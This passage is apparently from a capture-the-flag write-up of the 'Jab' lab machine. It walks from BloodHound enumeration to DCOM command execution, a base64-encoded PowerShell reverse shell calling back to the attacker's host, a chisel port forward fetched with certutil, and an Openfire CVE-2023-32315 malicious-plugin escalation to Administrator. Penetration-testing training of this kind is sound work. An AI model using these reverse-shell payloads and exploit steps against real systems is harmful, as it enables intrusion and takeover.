❯ bloodhound-python -d jab.htb -u jmontgomery -p 'Midnight_121' -ns 10.10.11.4 -c All --zip
```

Remember to mark as owned the owned users we have (in this case jmontgomery and svc_openfire)

![Mark user jmontgomery as owned](/assets/images/Jab/mark-jmontgomery-as-owned.png)

![Mark user svc_openfire as owned](/assets/images/Jab/mark-svc_openfire-as-owned.png)

Now, looking at "Shortest path from owned principals > svc_openfire", we can see that svc_openfire has ExecuteDCOM privilege in the DC, which allows executing commands because it belongs to the "Distributed COM Users local" group:

![ExecuteDCOM privilege of svc_openfire](/assets/images/Jab/executedcom-privilege-svc_openfire.png)

So we can use dcomexec.py to execute a command, we can confirm it by doing a ping to our IP:

```bash
❯ dcomexec.py -object MMC20 -silentcommand 'jab.htb'/'svc_openfire':'!@#$%^&*(1qazxsw'@10.10.11.4 'ping -n 1 10.10.14.53'
```

* -silentcommand: to hide the output of the command (since it doesn't works)

And we receive the ICMP packet:

```bash
❯ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:39:30.321644 IP jab.htb > kali: ICMP echo request, id 1, seq 72, length 40
18:39:30.321690 IP kali > jab.htb: ICMP echo reply, id 1, seq 72, length 40
```

Now that we have confirmed we have command execution I will use "Powershell #3 (Base64)" payload from [revshells](https://revshells.com) to receive a powershell shell. For that I will need to create a nc listener and put the command in dcomexec.py

**NC listener**:
```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

**RCE command**:
```bash
❯ dcomexec.py -object MMC20 -silentcommand 'jab.htb'/'svc_openfire':'!@#$%^&*(1qazxsw'@10.10.11.4 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAzACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='
```

Now we have a shell received as svc_openfire:

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.53] from (UNKNOWN) [10.10.11.4] 61537

PS C:\windows\system32> whoami
jab\svc_openfire
```

And we can see user.txt:

```powershell
PS C:\Users\svc_openfire\Desktop> type user.txt
fa****************************d7
```
# Privilege escalation to Administrator

Looking at internal ports running, we can see ports 9090 and 9091:

```powershell
PS C:\> netstat -ano | findstr LISTEN
<SNIP>
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2888
  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3248
  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3248
<SNIP>
```

I will forward it to my machine using [chisel](https://github.com/jpillora/chisel/releases/tag/v1.9.1) that I need to download it from my HTTP server and place it in a temp folder directory (C:\Windows\Temp\privesc) that is always a good practice to be anonymous:

**Download chisel from its repository and create HTTP server**
```bash
# Chisel for windows
❯ wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
❯ mv chisel_1.9.1_windows_amd64.gz chisel.exe.gz
❯ gzip -d chisel.exe.gz
# Chisel for linux (for the server)
❯ wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
❯ mv chisel_1.9.1_linux_amd64.gz chisel.gz
❯ gzip -d chisel.gz
# Show files and create HTTP server
❯ ls; python3 -m http.server 80
chisel chisel.exe
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**Create chisel server to receive connections**: 
```bash
❯ ./chisel server -p 1234 --reverse
2024/07/04 19:21:20 server: Reverse tunnelling enabled
2024/07/04 19:21:20 server: Fingerprint sjhwVRpFj/C0QHInjMKpXA+nzV3J6pvqR8kcj9MPe1o=
2024/07/04 19:21:20 server: Listening on http://0.0.0.0:1234
```

**Download chisel for windows from your HTTP server and execute it in client mode to forward port 9090 and 9091 to your machine**:
```powershell
PS C:\Windows\Temp\privesc> certutil.exe -f -urlcache -split http://10.10.14.53/chisel.exe
****  Online  ****
  000000  ...
  896c00
CertUtil: -URLCache command completed successfully.
PS C:\Windows\Temp\privesc> .\chisel.exe client 10.10.14.53:1234 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091
```

We receive the connection in the chisel server:

```plaintext
2024/07/04 19:23:47 server: session#1: tun: proxy#R:9090=>9090: Listening
2024/07/04 19:23:47 server: session#1: tun: proxy#R:9091=>9091: Listening
```

Looking at what this ports are related to, we can see that it's for openfire administration console version 4.7.5:

![Openfire administration console v4.7.5](/assets/images/Jab/openfire-v4.7.5.png)

Trying to reuse the credentials of svc_openfire works and we can access the panel:

![Access openfire panel](/assets/images/Jab/access-openfire-panel.png)

Searching for vulnerabilities we end up with [this post](https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce) that talks about using a path traversal vulnerability to create a new user and have administrator access for later uploading a malicious plugin that allow executing commands. However, we already have credentials and we only have to upload the vulnerable plugin. The post also gives us a [link](https://github.com/miko550/CVE-2023-32315) to download the malicious plugin, so I will download it and upload to execute commands. For this go to Plugins > (upload the plugin):

![Upload malicious plugin](/assets/images/Jab/upload-malicious-plugin.png)

Now, go to Server > Server settings and select Management Tool (which is the malicious plugin), enter the password 123 (as said in the post) and we can see we are Administrator user:

![Openfire malicious Management Tool](/assets/images/Jab/management-tool-openfire.png)

![We are administrator](/assets/images/Jab/we-are-administrator-openfire.png)

The only thing we have left is execute a command that gives us a reverse shell, so I will use the same "Powershell #3 Base64" payload of [revshells](https://revshells.com) after spawning a nc listener:

```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

![Powershell encoded command executed in openfire](/assets/images/Jab/powershell-encoded-openfire.png)

We finally received the Administrator shell and we can see root.txt:

```powershell
PS C:\Program Files\Openfire\bin> cd \Users\administrator\Desktop
PS C:\Users\administrator\Desktop> type root.txt
e8****************************4e
```

That's the machine guys, hope you liked it :).
